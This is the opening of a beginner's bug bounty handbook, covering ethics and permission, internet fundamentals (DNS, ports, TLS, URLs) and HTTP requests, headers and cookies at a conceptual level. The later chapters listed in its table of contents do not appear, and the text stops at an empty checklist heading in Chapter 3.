# The Complete Bug Bounty Handbook

## For begginers

---

> _"Security is not a product, but a process."_ — Bruce Schneier

---
# Table of Contents

**PART ONE: FOUNDATIONS**

- Chapter 1: What Is Bug Bounty Hunting?
- Chapter 2: The Internet — How It Actually Works
- Chapter 3: HTTP — The Language of the Web
- Chapter 4: Browsers and Developer Tools
- Chapter 5: Linux for Bug Bounty Hunters
- Chapter 6: Setting Up Your Lab Environment

**PART TWO: TOOLS**

- Chapter 7: Burp Suite — Complete Guide
- Chapter 8: curl and the Command Line
- Chapter 9: Reconnaissance Tools

**PART THREE: RECONNAISSANCE**

- Chapter 10: Bug Bounty Programs and Scope
- Chapter 11: Passive Reconnaissance
- Chapter 12: Active Reconnaissance
- Chapter 13: Subdomain Enumeration
- Chapter 14: Web Application Mapping

**PART FOUR: VULNERABILITIES**

- Chapter 15: Cross-Site Scripting (XSS)
- Chapter 16: SQL Injection
- Chapter 17: Broken Access Control
- Chapter 18: Authentication Vulnerabilities
- Chapter 19: Server-Side Request Forgery (SSRF)
- Chapter 20: Insecure Direct Object References (IDOR)
- Chapter 21: Business Logic Vulnerabilities
- Chapter 22: File Upload Vulnerabilities
- Chapter 23: XML External Entity Injection (XXE)
- Chapter 24: Command Injection
- Chapter 25: Path Traversal
- Chapter 26: Open Redirect
- Chapter 27: CSRF

**PART FIVE: REPORTING**

- Chapter 28: Writing Professional Bug Reports
- Chapter 29: Bug Bounty Platforms and Programs

**PART SIX: ADVANCED**

- Chapter 30: API Security Testing
- Chapter 31: JavaScript Analysis
- Chapter 32: Building Automation Pipelines
- Chapter 33: CORS Misconfiguration
- Chapter 34: Server-Side Template Injection (SSTI)
- Chapter 35: HTTP Request Smuggling
- Chapter 36: Insecure Deserialization
- Chapter 37: Race Conditions
- Chapter 38: OAuth 2.0 Vulnerabilities
- Chapter 39: JWT Attacks
- Chapter 40: GraphQL Security Testing
- Chapter 41: WebSocket Security Testing
- Chapter 42: Subdomain Takeover (Deep Dive)
- Chapter 43: Mobile App Security Testing (Android & iOS)
- Chapter 44: Source Code Review for Bug Bounty

**PART SEVEN: PROFESSIONAL**

- Chapter 45: Understanding CVSS v3 Scoring
- Chapter 46: Handling Duplicates, Triage & Program Communication
- Chapter 47: Taxes, Income & Bug Bounty as a Career
- Chapter 48: Building a Reputation and Getting Invited to Private Programs

**PART EIGHT: REFERENCE**

- Chapter 49: The Ultimate Bug Bounty Field Checklist
---

# PART ONE: FOUNDATIONS

---

# Chapter 1: What Is Bug Bounty Hunting?

## Objective

Understand what bug bounty hunting is, how it works legally and ethically, what the industry looks like, and what realistic expectations to set as you begin this journey.

## Prerequisites

None. This is Chapter 1.

## Terminology

| Term                    | Definition                                                                        |
| ----------------------- | --------------------------------------------------------------------------------- |
| **Vulnerability**       | A weakness in software that an attacker could exploit                             |
| **Bug**                 | Informal term for a software flaw (not always security-related)                   |
| **Bug Bounty**          | A program where companies pay researchers who find vulnerabilities                |
| **Security Researcher** | A person who studies systems to find and report security flaws                    |
| **Penetration Tester**  | A security professional hired to test systems for vulnerabilities                 |
| **Scope**               | The list of systems a bug bounty program allows you to test                       |
| **CVE**                 | Common Vulnerabilities and Exposures — a public database of known vulnerabilities |
| **Disclosure**          | The process of telling a company about a vulnerability you found                  |
| **Hall of Fame**        | A public acknowledgment list maintained by companies for researchers              |
| **Triage**              | The process a company uses to review and classify vulnerability reports           |

## Theory

### What Is a Vulnerability?

Every piece of software was written by humans. Humans make mistakes. Sometimes those mistakes create security weaknesses — ways that an attacker could use the software in a way the developers never intended, causing harm.

Here is an analogy: Imagine a bank vault with a door that has a combination lock. The designers intended the lock to keep people out. But suppose a mistake was made during manufacturing — if you press the handle a certain way while entering any combination, the door opens. That is a vulnerability. The door still looks secure. Most people would never discover the flaw. But someone who knows about it can walk right in.

Web applications have similar flaws. A login page might accept special characters in a way that lets an attacker bypass the password check entirely. A file upload form might accept executable files when it should only accept images. A user profile page might show other users' private information if you change a number in the URL.

### What Is Bug Bounty Hunting?

Bug bounty hunting is the profession of finding these vulnerabilities in web applications — with the company's permission — and reporting them in exchange for a reward (a "bounty").

Companies run bug bounty programs because:

1. **They cannot test everything themselves.** Large applications have millions of lines of code, hundreds of features, and interact with dozens of other services. Internal security teams cannot find every flaw.
2. **Outside eyes see differently.** Attackers think differently than developers. Professional researchers are trained to find the flaws developers overlooked.
3. **It is cheaper than a breach.** Paying a researcher $1,000 to find a critical vulnerability is far less expensive than dealing with a data breach that could cost millions.
4. **It builds trust.** Companies that run bug bounty programs signal that they take security seriously.

### The Legal Foundation: Permission Is Everything

This is the most important principle in this entire handbook:

> **You must have explicit, written permission before testing any system.**

The difference between a bug bounty hunter and a criminal is permission. If a company has a bug bounty program and their program policy says you can test their application, you have permission. If they do not, you do not — and testing without permission is illegal in most countries, regardless of your intentions.

Bug bounty programs provide that permission in writing. The program policy document spells out exactly what you are allowed to test (the "scope") and what you are not allowed to do.

### How the Bug Bounty Ecosystem Works

```
COMPANY                                             RESEARCHER
│                                                   │
│ Has web application                               │ Has security skills
│ Wants it tested                                   │ Wants to find vulnerabilities
│ Runs bug bounty program                           │ Joins bug bounty program
│                                                   │
└──────────────── BUG BOUNTY PLATFORM ──────────────┘
                        │
                HackerOne, Bugcrowd,
                Intigriti, YesWeHack,
                Synack, private programs
```

**Step 1:** Company creates a bug bounty program on a platform (or privately).

**Step 2:** Company defines the scope — which domains, applications, and systems are in scope — and what behaviors are prohibited.

**Step 3:** Company sets reward amounts for different severity levels.

**Step 4:** Researchers read the program policy and begin testing within the defined scope.

**Step 5:** Researcher finds a vulnerability.

**Step 6:** Researcher writes a clear report explaining the vulnerability, how to reproduce it, and its impact.

**Step 7:** Company reviews the report (triage), validates the vulnerability, and determines its severity.

**Step 8:** Company pays the bounty and fixes the vulnerability.

**Step 9:** Researcher may be listed in the company's Hall of Fame.

### The Bug Bounty Platforms

The major platforms where you will find bug bounty programs:

|Platform|URL|Notes|
|---|---|---|
|**HackerOne**|hackerone.com|Largest platform, many public and private programs|
|**Bugcrowd**|bugcrowd.com|Large selection, good for beginners|
|**Intigriti**|intigriti.com|European-focused, high quality programs|
|**YesWeHack**|yeswehack.com|European platform, growing rapidly|
|**Synack**|synack.com|Invitation-only, professional researchers|
|**Open Bug Bounty**|openbugbounty.org|Free, community-driven|

Many companies also run their own private programs directly. Google, Meta, Apple, Microsoft, and many others manage their own programs without going through a third-party platform.

### What Can You Earn?

Bounty amounts vary enormously based on:

- **Severity of the vulnerability:** Critical vulnerabilities earn far more than informational ones
- **Company size and budget:** Large tech companies pay more than startups
- **Type of program:** Invite-only programs often pay more than public ones
- **Impact:** How much harm could the vulnerability cause?

Typical ranges (these vary widely):

|Severity|Typical Range|
|---|---|
|Critical|$5,000 — $100,000+|
|High|$1,000 — $15,000|
|Medium|$200 — $3,000|
|Low|$50 — $500|
|Informational|$0 — $100 (often $0)|

Some researchers earn six figures annually from bug bounty. Most beginners earn little or nothing in their first six months. Setting realistic expectations is essential.

### What Bug Bounty Hunting Is NOT

- **It is not illegal hacking.** You have permission.
- **It is not easy money.** It requires deep technical knowledge and creativity.
- **It is not a shortcut.** There is no tool that automatically finds bounties.
- **It is not quick.** Building the skills to consistently find vulnerabilities takes months or years.

### The Ethics of Security Research

Ethical bug bounty hunters follow a clear code:

1. **Only test what is in scope.** If the program says do not test the customer portal, do not test it.
2. **Do not access data you do not need to.** If you can prove a vulnerability exists without reading real user data, stop there.
3. **Do not cause damage.** Do not delete data, crash servers, or disrupt services.
4. **Report promptly.** When you find something, report it. Do not sit on it.
5. **Do not disclose publicly before the company fixes it.** This is called responsible disclosure.
6. **Do not extort.** Threatening to publish a vulnerability unless paid is a crime.

## Mental Model: How a Professional Thinks

A professional bug bounty hunter does not think like a criminal trying to steal data. They think like a quality assurance engineer who specializes in finding security flaws.

They ask: _"How could this feature be abused?"_

They think: _"What happens if I send unexpected input here?"_

They wonder: _"Did the developers consider what happens if a user tries to do something they are not supposed to?"_

This mindset — curiosity combined with systematic thinking — is the foundation of everything that follows in this handbook.

## Practice Labs

Before any technical skills are needed, get familiar with the ecosystem:

1. **Create a HackerOne account** at hackerone.com. Browse public programs and read three program policies. Notice what is in scope and out of scope.
2. **Create a Bugcrowd account** at bugcrowd.com. Do the same.
3. **Read the HackerOne disclosure guidelines** at hackerone.com/disclosure-guidelines.
4. **Browse HackerOne's Hacktivity** — a feed of publicly disclosed vulnerabilities. Read 10 reports. Notice the format, the detail, the proof of concept.

## References

- HackerOne Platform: hackerone.com
- Bugcrowd Platform: bugcrowd.com
- OWASP (Open Web Application Security Project): owasp.org
- CVE Database: cve.mitre.org

## Summary

Bug bounty hunting is the legal, ethical profession of finding security vulnerabilities in applications with company permission and reporting them for a reward. It requires technical knowledge, a curious mindset, and strict adherence to ethical and legal boundaries. The ecosystem is built around bug bounty platforms that connect companies with security researchers. Beginners should expect a significant learning curve before earning consistent rewards.

## Checklist

- [ ] Understand what a vulnerability is
- [ ] Understand what a bug bounty program is
- [ ] Know the difference between legal research and illegal hacking (permission)
- [ ] Have created accounts on HackerOne and Bugcrowd
- [ ] Have read at least three program policies
- [ ] Have read at least ten public vulnerability disclosures
- [ ] Understand the ethical rules of bug bounty hunting

---

# Chapter 2: The Internet — How It Actually Works

## Objective

Understand the fundamental architecture of the internet and web applications at a level that allows you to intelligently test them for security vulnerabilities. You cannot find flaws in a system you do not understand.

## Prerequisites

Chapter 1 complete.

## Terminology

|Term|Definition|
|---|---|
|**IP Address**|A unique numerical address that identifies a device on a network|
|**Domain Name**|A human-readable name for an IP address (e.g., google.com)|
|**DNS**|Domain Name System — the internet's phone book, converts domain names to IP addresses|
|**Server**|A computer that provides services to other computers|
|**Client**|A computer that requests services from a server|
|**Port**|A numbered "door" on a computer through which network traffic flows|
|**Protocol**|A set of rules for how computers communicate|
|**TCP/IP**|The fundamental protocols that power internet communication|
|**HTTP**|HyperText Transfer Protocol — the protocol used for web communication|
|**HTTPS**|HTTP with encryption (via TLS)|
|**TLS/SSL**|Protocols that encrypt communications between client and server|
|**Request**|A message from a client asking a server for something|
|**Response**|A message from a server answering a client's request|
|**URL**|Uniform Resource Locator — a web address|
|**CDN**|Content Delivery Network — a system of servers distributed globally to speed up content delivery|
|**Load Balancer**|A device that distributes traffic across multiple servers|

## Theory

### The Big Picture: What Happens When You Visit a Website

When you type `https://example.com` into your browser and press Enter, a remarkable sequence of events unfolds — all in under a second. Understanding each step is essential for security testing.

```
YOU (Browser)                        INTERNET                      SERVER
    │                                    │                              │
    │ 1. Type "example.com"              │                              │
    │                                    │                              │
    │ 2. Ask DNS: "What is the IP        │                              │
    │    address for example.com?"       │                              │
    │──────────────────────────────────►│                              │
    │                               DNS Server                         │
    │◄──────────────────────────────────│                              │
    │ 3. DNS answers: "93.184.216.34"   │                              │
    │                                    │                              │
    │ 4. Connect to 93.184.216.34        │                              │
    │    on port 443 (HTTPS)             │                              │
    │───────────────────────────────────────────────────────────────►  │
    │                                    │                              │
    │ 5. Negotiate TLS encryption        │                              │
    │◄─────────────────────────────────────────────────────────────── │
    │                                    │                              │
    │ 6. Send HTTP request:              │                              │
    │    GET / HTTP/1.1                  │                              │
    │    Host: example.com               │                              │
    │───────────────────────────────────────────────────────────────►  │
    │                                    │                              │
    │ 7. Receive HTTP response:          │                              │
    │    200 OK                          │                              │
    │    [HTML content]                  │                              │
    │◄─────────────────────────────────────────────────────────────── │
    │                                    │                              │
    │ 8. Render HTML in browser          │                              │
```

Each of these steps is a potential area of security research. Let us understand each one.

### Step 1: IP Addresses — The Internet's Addressing System

Every device connected to the internet has an IP address. Think of it like a postal address — it uniquely identifies where a device is located on the network.

**IPv4 addresses** look like four numbers separated by dots: `192.168.1.1` or `93.184.216.34`. Each number is between 0 and 255.

**IPv6 addresses** look like: `2606:2800:220:1:248:1893:25c8:1946`. IPv6 was created because we ran out of IPv4 addresses.

**Private IP addresses** are used within local networks (your home, office) and are not routable on the public internet:

- `10.0.0.0 — 10.255.255.255`
- `172.16.0.0 — 172.31.255.255`
- `192.168.0.0 — 192.168.255.255`

**Why this matters for bug bounty:** Server-Side Request Forgery (SSRF) attacks often try to make a web server contact these private addresses. Understanding IP ranges helps you craft better test payloads.

### Step 2: DNS — The Internet's Phone Book

No one memorizes IP addresses. Instead, we use domain names like `google.com`. The Domain Name System (DNS) translates these names into IP addresses.

**The DNS hierarchy:**

```
.(root)
│
├── .com                   (top-level domain / TLD)
│   ├── google.com         (second-level domain)
│   │   ├── www.google.com (subdomain)
│   │   ├── mail.google.com
│   │   └── api.google.com
│   └── example.com
│
├── .org
│   └── mozilla.org
│
└── .io
    └── github.io
```

**DNS record types:**

|Record Type|Purpose|Example|
|---|---|---|
|**A**|Maps domain to IPv4 address|`example.com → 93.184.216.34`|
|**AAAA**|Maps domain to IPv6 address|`example.com → 2606:2800:...`|
|**CNAME**|Alias, points to another domain|`www.example.com → example.com`|
|**MX**|Mail server for the domain|`example.com → mail.example.com`|
|**TXT**|Text records, often used for verification|`v=spf1 include:...`|
|**NS**|Name servers for the domain|`example.com → ns1.example.com`|

**Why this matters for bug bounty:** DNS records reveal the infrastructure of a target. They expose subdomains, mail servers, hosting providers, cloud services, and more. Subdomain enumeration is one of the most important recon techniques.

### Step 3: Ports — The Internet's Doorways

If an IP address is like a building's street address, a port is like an apartment number. They tell you specifically which service to connect to on a server.

A server can run many services simultaneously on different ports. Port numbers range from 0 to 65535.

**Common ports:**

|Port|Protocol|Service|
|---|---|---|
|21|FTP|File Transfer Protocol|
|22|SSH|Secure Shell (remote access)|
|25|SMTP|Email sending|
|53|DNS|Domain Name System|
|80|HTTP|Unencrypted web traffic|
|143|IMAP|Email retrieval|
|443|HTTPS|Encrypted web traffic|
|3306|MySQL|MySQL database|
|5432|PostgreSQL|PostgreSQL database|
|6379|Redis|Redis cache/database|
|8080|HTTP-alt|Alternative HTTP (common for dev servers)|
|8443|HTTPS-alt|Alternative HTTPS|
|27017|MongoDB|MongoDB database|

**Why this matters for bug bounty:** When a server accidentally exposes database ports (3306, 5432, 27017) to the internet, it is a critical vulnerability. Port scanning during reconnaissance helps discover exposed services.

### Step 4: TCP/IP — How Data Actually Travels

The internet uses a set of protocols called TCP/IP to move data between computers.

**IP (Internet Protocol)** handles addressing and routing — getting packets from point A to point B.

**TCP (Transmission Control Protocol)** ensures reliable delivery. It breaks data into packets, sends them, and ensures they all arrive and are reassembled correctly. It does this through:

1. **Three-way handshake** to establish a connection: SYN → SYN-ACK → ACK
2. **Acknowledgments** for every packet received
3. **Retransmission** if packets are lost

**UDP (User Datagram Protocol)** is faster but unreliable — used for streaming, gaming, DNS.

**Why this matters for bug bounty:** Understanding TCP helps you understand how tools like port scanners work. It also helps you understand certain attack classes.

### Step 5: TLS — Encryption for the Web

When you visit `https://` (with the "s"), your connection is encrypted using TLS (Transport Layer Security). This prevents anyone between you and the server from reading your traffic.

**TLS handshake (simplified):**

```
Browser                              Server
   │                                    │
   │── "Hello, I support TLS 1.3" ────►│
   │                                    │
   │◄── "Hello, here is my certificate"─│
   │◄── "Here is the server's public key│
   │                                    │
   │── [Verify certificate is valid]    │
   │── [Generate session key]           │
   │── [Encrypt session key with        │
   │    server's public key]            │
   │── "Here is the encrypted key" ────►│
   │                                    │
   │◄── [Server decrypts the session key│
   │                                    │
   │── [Both sides now have the same    │
   │    session key]                    │
   │── Encrypted communication begins  ─│
```

**TLS certificates** are digital documents that prove a server is who it claims to be. They are issued by Certificate Authorities (CAs) like Let's Encrypt, DigiCert, and Comodo.

**Why this matters for bug bounty:**

- TLS certificate transparency logs are public records of all certificates issued — a goldmine for finding subdomains
- Misconfigured TLS can be a vulnerability
- HTTPS does not mean a site is secure — it just means the connection is encrypted. The application itself can still be full of vulnerabilities.

### How Web Applications Work

A modern web application is not just a single server sending HTML. It is a complex system of components:

```
                    USER'S BROWSER
                         │
                    HTTPS request
                         │
                    ┌────▼────┐
                    │   CDN   │ (Optional: Cloudflare, Fastly)
                    └────┬────┘
                         │
                    ┌────▼────┐
                    │  Load   │ (Distributes traffic)
                    │Balancer │
                    └────┬────┘
                         │
              ┌──────────┼──────────┐
              │          │          │
         ┌────▼───┐ ┌────▼───┐ ┌───▼────┐
         │ Web    │ │ Web    │ │ Web    │
         │ Server │ │ Server │ │ Server │
         │  #1    │ │  #2    │ │  #3    │
         └────┬───┘ └────┬───┘ └───┬────┘
              │          │          │
         ┌────▼──────────▼──────────▼────┐
         │         Application           │
         │         Server Layer          │
         │    (Node.js, PHP, Python,     │
         │     Java, Ruby, etc.)         │
         └────────────────┬──────────────┘
                          │
         ┌────────────────┼─────────────────┐
         │                │                  │
    ┌────▼────┐    ┌──────▼──────┐   ┌──────▼───────┐
    │Database │    │  Cache      │   │  External    │
    │(MySQL,  │    │  (Redis,    │   │  APIs        │
    │Postgres)│    │  Memcached) │   │              │
    └─────────┘    └─────────────┘   └──────────────┘
```

Each component in this architecture can have its own vulnerabilities. Bug bounty hunting involves finding flaws anywhere in this stack.

**Front end:** The code that runs in the user's browser (HTML, CSS, JavaScript). Vulnerable to XSS, client-side injection attacks, insecure storage.

**Back end:** The server-side code that processes requests and interacts with databases. Vulnerable to SQL injection, command injection, SSRF, authentication flaws.

**Database:** Where application data is stored. Vulnerable via SQL injection, misconfiguration.

**APIs:** How different parts of the application (and external services) communicate. Often poorly secured, a rich source of vulnerabilities.

### URLs — The Address of a Web Resource

A URL (Uniform Resource Locator) has several parts:

```
https://api.example.com:8443/user/profile?id=123&view=full#section2
│       │               │    │            │               │
│       │               │    │            │               └─ Fragment (client-only)
│       │               │    │            └─ Query parameters
│       │               │    └─ Path
│       │               └─ Port (optional, default 443 for HTTPS)
│       └─ Subdomain.Domain.TLD
└─ Protocol/Scheme
```

**Why each part matters for security testing:**

- **Protocol:** Is HTTPS enforced? Can you downgrade to HTTP?
- **Subdomain:** Different subdomains may have different security controls
- **Domain:** Defines the scope of cookies and same-origin policy
- **Port:** Non-standard ports may host admin interfaces or development servers
- **Path:** Different paths have different access controls
- **Query parameters:** The most common injection point for many vulnerability classes
- **Fragment:** Processed only by the browser, never sent to server — relevant for DOM-based XSS

## Visual Diagram: The Request-Response Cycle

```
BROWSER                                          WEB SERVER
┌──────────────────────────┐                    ┌────────────────────────────────┐
│                          │                    │                                │
│  1. User enters URL      │                    │                                │
│  2. DNS lookup           │                    │                                │
│  3. TCP connection       │◄──────────────────►│  Listening on port 80/443      │
│  4. TLS handshake (HTTPS)│                    │                                │
│                          │                    │                                │
│  HTTP REQUEST            │                    │                                │
│  ─────────────────────── │─────────────────► │                                │
│  GET /login HTTP/1.1     │                    │  Receives request              │
│  Host: example.com       │                    │  Routes to application         │
│  Cookie: session=abc123  │                    │  Application queries database  │
│  User-Agent: Mozilla/5.0 │                    │  Application generates HTML    │
│                          │                    │                                │
│  HTTP RESPONSE           │                    │                                │
│  ─────────────────────── │◄───────────────── │                                │
│  HTTP/1.1 200 OK         │                    │  Sends response                │
│  Content-Type: text/html │                    │                                │
│  Set-Cookie: token=xyz   │                    │                                │
│  [HTML body]             │                    │                                │
│                          │                    │                                │
│  3. Browser renders HTML │                    │                                │
└──────────────────────────┘                    └────────────────────────────────┘
```

## Mental Model

Think of the internet as a postal system:

- **IP address** = your home address
- **Domain name** = a person's name (easier to remember than their address)
- **DNS** = the address book that converts names to addresses
- **Port** = the specific room in the building (different services in different rooms)
- **HTTP request** = a letter you send asking for something
- **HTTP response** = the reply you receive
- **TLS** = an envelope that only the recipient can open

As a bug bounty hunter, you need to understand this postal system deeply — because you are looking for ways the system can be abused, intercepted, forged, or manipulated.

## Summary

The internet is a system of interconnected computers communicating via standardized protocols. DNS converts domain names to IP addresses. TCP/IP moves data reliably between computers. TLS encrypts that data. HTTP is the protocol web applications use to communicate. Understanding this stack — from DNS records to URL structure to the request/response cycle — is the foundation for understanding every web application vulnerability you will ever test.

## Checklist

- [ ] Understand what an IP address is and the difference between public and private ranges
- [ ] Understand what DNS is and be able to name at least four DNS record types
- [ ] Understand what a port is and know at least 10 common port numbers
- [ ] Understand the difference between HTTP and HTTPS
- [ ] Can explain what TLS does and why it matters
- [ ] Understand the parts of a URL
- [ ] Understand the basic request-response cycle
- [ ] Understand the components of a multi-tier web application

---

# Chapter 3: HTTP — The Language of the Web

## Objective

Understand the HTTP protocol in enough depth to read, craft, manipulate, and analyze HTTP requests and responses — the fundamental skill that underlies all web application security testing.

## Prerequisites

Chapter 2 complete.

## Terminology

|Term|Definition|
|---|---|
|**HTTP**|HyperText Transfer Protocol — how browsers and servers talk|
|**HTTP Method**|The action being requested (GET, POST, PUT, DELETE, etc.)|
|**HTTP Header**|Metadata attached to a request or response|
|**HTTP Status Code**|A three-digit code indicating the result of a request|
|**Request Body**|Data sent along with a POST/PUT request|
|**Response Body**|The content returned by the server|
|**Cookie**|A small piece of data stored in the browser and sent with requests|
|**Session**|A way of maintaining state between requests|
|**CORS**|Cross-Origin Resource Sharing — controls which origins can access resources|
|**Content-Type**|Header declaring the format of the request/response body|
|**Stateless**|HTTP does not remember previous requests by default|

## Theory

### HTTP: The Language of the Web

HTTP stands for HyperText Transfer Protocol. It is the protocol that defines how web browsers and servers communicate. Every interaction you have with a web application — clicking a button, submitting a form, loading a page — is an HTTP request and response.

HTTP is a **text-based protocol**, meaning the messages are human-readable text. This is enormously helpful for security testing because you can read, modify, and craft HTTP messages manually.

HTTP is **stateless** — each request is independent. The server does not remember your previous requests. This statelessness is compensated for by mechanisms like cookies and sessions, which we will cover shortly.

### HTTP Requests

An HTTP request has three main parts:

**1. The Request Line:** Contains the HTTP method, the path, and the HTTP version.

**2. Headers:** Key-value pairs providing additional information about the request.

**3. Body (optional):** Data sent with the request (common in POST, PUT, PATCH).

Here is a complete HTTP request annotated:

```
POST /login HTTP/1.1                    ← Method Path Protocol-Version
Host: example.com                       ← Which server to contact
Content-Type: application/x-www-form-urlencoded  ← Format of the body
Content-Length: 29                      ← Size of the body in bytes
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64)  ← Browser info
Accept: text/html,application/xhtml+xml ← What response formats browser accepts
Cookie: session=abc123def456            ← Cookies sent automatically
Origin: https://example.com            ← Where request originated
Referer: https://example.com/login     ← Previous page
Connection: keep-alive                  ← Reuse the TCP connection
                                        ← Empty line separates headers from body
username=admin&password=secret          ← Request body (URL-encoded)
```

### HTTP Methods

HTTP methods (also called "verbs") tell the server what action to perform:

|Method|Purpose|Has Body?|Notes|
|---|---|---|---|
|**GET**|Retrieve data|No|Should never modify data|
|**POST**|Submit data / create resource|Yes|Used for forms, logins|
|**PUT**|Replace a resource entirely|Yes|Idempotent|
|**PATCH**|Partially update a resource|Yes||
|**DELETE**|Delete a resource|Sometimes||
|**HEAD**|Like GET but returns only headers|No|Tests if resource exists|
|**OPTIONS**|Lists allowed methods|No|Used in CORS preflight|
|**TRACE**|Echo the request back|No|Security risk, usually disabled|

**Security implications:**

- Applications sometimes enforce authorization only on certain methods. If an action is protected on POST but not PUT, you can bypass it.
- HTTP method override attacks let you spoof methods using `_method=DELETE` in a POST body.
- TRACE can reveal sensitive headers and enable Cross-Site Tracing (XST) attacks.

### HTTP Status Codes

The server's response begins with a three-digit status code that tells you whether the request succeeded and what happened:

**1xx — Informational:**

- `100 Continue` — Server received the request headers, client should proceed

**2xx — Success:**

- `200 OK` — Request succeeded, body contains the result
- `201 Created` — Resource was successfully created
- `204 No Content` — Success but no body to return

**3xx — Redirection:**

- `301 Moved Permanently` — Resource has moved, update your bookmarks
- `302 Found` — Temporary redirect
- `304 Not Modified` — Browser's cached version is still valid

**4xx — Client Errors:**

- `400 Bad Request` — Malformed request
- `401 Unauthorized` — Authentication required
- `403 Forbidden` — Authenticated but not authorized
- `404 Not Found` — Resource does not exist
- `405 Method Not Allowed` — HTTP method not supported
- `429 Too Many Requests` — Rate limited

**5xx — Server Errors:**

- `500 Internal Server Error` — Something crashed on the server
- `502 Bad Gateway` — Upstream server problem
- `503 Service Unavailable` — Server overloaded or down

**Security implications of status codes:**

- `401 vs 403` — 401 means not logged in; 403 means logged in but forbidden. If you get 401, try authenticating. If you get 403, you might be able to bypass authorization.
- `500 errors` — Server errors often indicate you have caused unexpected behavior — possibly exploitable.
- Status codes can be misleading — an application might return `200 OK` but contain an error message in the body, or return `403` but still execute the action.

### HTTP Headers — Deep Dive

Headers are key-value pairs that carry metadata. There are request headers, response headers, and general headers.

**Critical Request Headers:**

|Header|Purpose|Security Relevance|
|---|---|---|
|`Host`|Specifies the target server|Host header injection attacks|
|`Cookie`|Sends stored cookies|Session hijacking target|
|`Authorization`|Carries auth credentials/tokens|Token theft/manipulation|
|`Content-Type`|Body format|MIME type confusion attacks|
|`Origin`|Where the request came from|CORS bypass testing|
|`Referer`|Previous page|Can reveal sensitive URLs|
|`X-Forwarded-For`|Client IP (when behind proxy)|IP whitelist bypass|
|`User-Agent`|Browser identification|User-Agent based access controls|

**Critical Response Headers:**

|Header|Purpose|Security Relevance|
|---|---|---|
|`Set-Cookie`|Creates a cookie in browser|Cookie security flags|
|`Content-Type`|Body format|MIME sniffing attacks|
|`Content-Security-Policy`|Controls what browser can load|XSS mitigation|
|`X-Frame-Options`|Controls iframe embedding|Clickjacking protection|
|`Strict-Transport-Security`|Forces HTTPS|HTTPS enforcement|
|`Access-Control-Allow-Origin`|CORS policy|CORS misconfiguration|
|`Server`|Server software and version|Information disclosure|
|`X-Powered-By`|Technology stack|Information disclosure|

**Security headers missing = potential vulnerability.** Part of your assessment is checking whether security headers are properly configured.

### Cookies — How Sessions Work

HTTP is stateless — the server forgets you after each request. Cookies solve this problem by storing small pieces of data in the browser that get sent automatically with every request to that domain.

When you log in:

1. You send your username and password in a POST request
2. The server validates your credentials
3. The server creates a session record in its database
4. The server returns a `Set-Cookie` header with a session token
5. Your browser stores the cookie
6. Every subsequent request automatically includes that cookie
7. The server reads the cookie, looks up the session, and knows who you are

**Cookie attributes:**

```
Set-Cookie: sessionid=abc123; 
            Path=/; 
            Domain=example.com; 
            Expires=Sat, 27 Jun 2026 00:00:00 GMT; 
            HttpOnly; 
            Secure; 
            SameSite=Strict
```

|Attribute|Effect|Security Relevance|
|---|---|---|
|`HttpOnly`|Cookie cannot be accessed by JavaScript|Prevents XSS-based cookie theft|
|`Secure`|Cookie only sent over HTTPS|Prevents theft over HTTP|
|`SameSite=Strict`|Cookie not sent in cross-site requests|CSRF protection|
|`SameSite=Lax`|Cookie sent in top-level navigations|Partial CSRF protection|
|`SameSite=None`|Cookie sent in all contexts|CSRF risk if not `Secure`|
|`Path`|Limits which paths the cookie is sent to|Scope limitation|
|`Domain`|Limits which domains receive the cookie|Scope limitation|

**Missing cookie flags = vulnerabilities:**

- No `HttpOnly` → XSS can steal the session
- No `Secure` → Cookie can be intercepted over HTTP
- No `SameSite` → CSRF attacks possible

### HTTP Request Bodies and Content Types

When you submit a form or send data to an API, the data travels in the request body. The format is specified by the `Content-Type` header.

**URL-encoded form data** (most common for HTML forms):

```
Content-Type: application/x-www-form-urlencoded

username=alice&password=secret&remember=true
```

Special characters are percent-encoded: space becomes `%20`, `&` becomes `%26`.

**JSON** (modern APIs):

```
Content-Type: application/json

{
  "username": "alice",
  "password": "secret"
}
```

**XML** (older applications and APIs):

```
Content-Type: application/xml

<?xml version="1.0"?>
<login>
  <username>alice</username>
  <password>secret</password>
</login>
```

**Multipart form data** (file uploads):

```
Content-Type: multipart/form-data; boundary=----WebKitFormBoundary7MA4YWxkTrZu0gW

------WebKitFormBoundary7MA4YWxkTrZu0gW
Content-Disposition: form-data; name="username"

alice
------WebKitFormBoundary7MA4YWxkTrZu0gW
Content-Disposition: form-data; name="avatar"; filename="photo.jpg"
Content-Type: image/jpeg

[binary file data]
------WebKitFormBoundary7MA4YWxkTrZu0gW--
```

**Security implications:** Many applications validate input differently depending on the `Content-Type`. Changing the content type from JSON to XML might bypass WAF rules. Sending XML when JSON is expected might trigger XML parsing that enables XXE attacks.

### HTTP/2 and HTTP/3

Modern web applications use newer versions of HTTP:

**HTTP/2** (2015):

- Binary protocol (not text-based like HTTP/1.1)
- Multiplexing — multiple requests in one connection simultaneously
- Header compression (HPACK)
- Server push

**HTTP/3** (2022):

- Built on QUIC instead of TCP
- Even faster, especially on unreliable connections

**Security implications:** HTTP/2 request smuggling is a real attack class. Burp Suite handles HTTP/2 testing. Understanding these versions helps when testing modern applications.

## Visual Diagram: Complete HTTP Transaction

```
═══════════════════════════════════════════════════════
                    HTTP REQUEST
═══════════════════════════════════════════════════════

┌─ REQUEST LINE ──────────────────────────────────────┐
│  POST /api/v1/login HTTP/1.1                        │
└─────────────────────────────────────────────────────┘
┌─ HEADERS ───────────────────────────────────────────┐
│  Host: api.example.com                              │
│  Content-Type: application/json                     │
│  Content-Length: 47                                 │
│  Authorization: Bearer eyJhbGci...                  │
│  X-Request-ID: f8a3b9c1                             │
└─────────────────────────────────────────────────────┘
┌─ BODY ──────────────────────────────────────────────┐
│  {"username": "alice", "password": "hunter2"}       │
└─────────────────────────────────────────────────────┘

═══════════════════════════════════════════════════════
                    HTTP RESPONSE
═══════════════════════════════════════════════════════

┌─ STATUS LINE ───────────────────────────────────────┐
│  HTTP/1.1 200 OK                                    │
└─────────────────────────────────────────────────────┘
┌─ HEADERS ───────────────────────────────────────────┐
│  Content-Type: application/json                     │
│  Set-Cookie: session=xyz789; HttpOnly; Secure       │
│  X-Content-Type-Options: nosniff                    │
│  X-Frame-Options: DENY                              │
│  Content-Security-Policy: default-src 'self'        │
└─────────────────────────────────────────────────────┘
┌─ BODY ──────────────────────────────────────────────┐
│  {"token": "eyJhbGci...", "user_id": 42}            │
└─────────────────────────────────────────────────────┘
```

## Things to Check — HTTP Security Checklist

**Request Headers to Examine:**

